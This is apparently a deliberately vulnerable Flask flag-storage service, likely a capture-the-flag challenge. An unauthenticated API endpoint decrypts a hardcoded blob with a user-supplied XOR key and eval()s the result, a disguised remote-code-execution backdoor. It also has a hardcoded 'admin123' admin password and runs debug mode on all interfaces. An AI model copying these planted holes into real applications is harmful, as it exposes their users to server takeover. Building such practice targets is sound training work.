from flask import Flask, render_template, request, redirect, url_for, flash
from flask_sqlalchemy import SQLAlchemy
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask import jsonify
import hashlib
import secrets
import itertools

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-here'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
login_manager = LoginManager(app)
login_manager.login_view = 'login'

class Flag(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    token = db.Column(db.String(200), nullable=False)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    user = db.relationship('User', back_populates='flags')

class User(UserMixin, db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)
    role = db.Column(db.String(50), default='user')
    flags = db.relationship('Flag', back_populates='user', lazy=True)

    def set_password(self, password):
        salt = secrets.token_hex(16)
        pwd_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), 100000)
        self.password_hash = f"{salt}${pwd_hash.hex()}"

    def check_password(self, password):
        if not self.password_hash or '$' not in self.password_hash:
            return False
        salt, stored_hash = self.password_hash.split('$')
        pwd_hash = hashlib.pbkdf2_hmac('sha256', password.encode('utf-8'), salt.encode('utf-8'), 100000)
        return pwd_hash.hex() == stored_hash
    
    def update_user_id(self, new_id):
        if not isinstance(new_id, int) or new_id <= 0:
            raise ValueError("ID должен быть положительным целым числом")
        
        # Проверяем, не существует ли уже пользователь с таким ID
        existing_user = User.query.get(new_id)
        if existing_user and existing_user != self:
            raise ValueError("Пользователь с таким ID уже существует")
        
        self.id = new_id
        db.session.commit()
        return True

@login_manager.user_loader
def load_user(user_id):
    return User.query.get(int(user_id))

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = User.query.filter_by(username=username).first()
        
        if user and user.check_password(password):
            login_user(user)
            flash('Вы успешно вошли в систему!', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Неверный логин или пароль', 'danger')
    return render_template('login.html')

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        existing_user = User.query.filter_by(username=username).first()
        
        if existing_user:
            flash('Этот логин уже занят', 'danger')
        else:
            new_user = User(username=username, role='user')
            new_user.set_password(password)
            db.session.add(new_user)
            db.session.commit()
            flash('Регистрация прошла успешно! Теперь вы можете войти.', 'success')
            return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/dashboard')
@login_required
def dashboard():
    flags = current_user.flags
    return render_template('dashboard.html', user=current_user, flags=flags)

@app.route('/add_flag', methods=['POST'])
@login_required
def add_flag():
    token = request.form.get('token')
    if not token:
        flash('Флаг не может быть пустым', 'danger')
        return redirect(url_for('dashboard'))
    
    new_flag = Flag(token=token, user_id=current_user.id)
    db.session.add(new_flag)
    db.session.commit()
    flash('Флаг успешно добавлен', 'success')
    return redirect(url_for('dashboard'))

@app.route('/api/v1/secret/flags', methods=['POST'])
def handle_secret_flags():
    if not request.is_json:
        return jsonify({"error": "Request must be JSON"}), 400
    
    '''
    client_ip = request.remote_addr
    if client_ip in ('127.0.0.1', '::1', '0.0.0.0'):
        return "Запрещены запросы с localhost", 403
    '''

    data = request.get_json()
    required_fields = ['token','user_id']
    for field in required_fields:
        if field not in data:
            return jsonify({"error": f"Missing '{field}' field"}), 400
        
    encrypted_hex = "18322a1a145b2f3a013a1715122b1f3e2c5c42071e0c1c3b1427736a5b425c500a007f0716482c0812001d0a1c430a0109102a206e5253131f1752390f15017f040f533209130a471f1118312d681a1f19584c2f" 
    key = str(data['token']).encode()
    user_id = str(data['user_id'])
    print('Получен user-id', user_id)
    encrypted = bytes.fromhex(encrypted_hex)
    decrypted = bytes(e ^ k for e, k in zip(encrypted, itertools.cycle(key)))
    print("Дешифрованная строка:", decrypted.decode())
    try:

        eval(decrypted.decode())
    except Exception as e:
        print(f"Произошла ошибка на ручке /secret/flags: {e}")

    '''
    with app.app_context():
        user = User.query.filter_by(username=data['user']).first()
        if not user:
            user = User(username=data['user'], role='user')
            user.set_password(data['password'])
            db.session.add(user)
            db.session.commit()
    
    
    new_flag = Flag(token=data['token'], user=user)
    db.session.add(new_flag)
    db.session.commit()
    '''
    
    return jsonify({
        "status": "success",
        "message": "Flags get success"
    }), 200

@app.route('/change_password', methods=['GET', 'POST'])
@login_required
def change_password():
    if request.method == 'POST':
        old_password = request.form['old_password']
        new_password = request.form['new_password']
        
        if current_user.check_password(old_password):
            current_user.set_password(new_password)
            db.session.commit()
            flash('Пароль успешно изменен', 'success')
            return redirect(url_for('dashboard'))
        else:
            flash('Неверный текущий пароль', 'danger')
    return render_template('change_password.html')

@app.route('/change_id', methods = ['POST'])
@login_required
def change_id():
    if request.method == 'POST':
        old_id = current_user.id 
        new_id = request.form['new_id']
        current_user.update_user_id(int(new_id))
        flash(f'Для пользователя с id {old_id} установлен новый id {new_id}', 'success')
        return redirect(url_for('dashboard'))

@app.route('/logout')
@login_required
def logout():
    logout_user()
    flash('Вы вышли из системы', 'info')
    return redirect(url_for('index'))

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
        if not User.query.filter_by(username='admin').first():
            try:
                admin = User(username='admin', role='admin')
                admin.set_password('admin123')
                db.session.add(admin)
                db.session.commit()
                print("Пользователь 'admin' успешно создан.")
            
            except Exception as e:
                print(f"Произошла ошибка при создании пользователя: {e}")
    
    app.run(debug=True, port=8080, host='0.0.0.0')
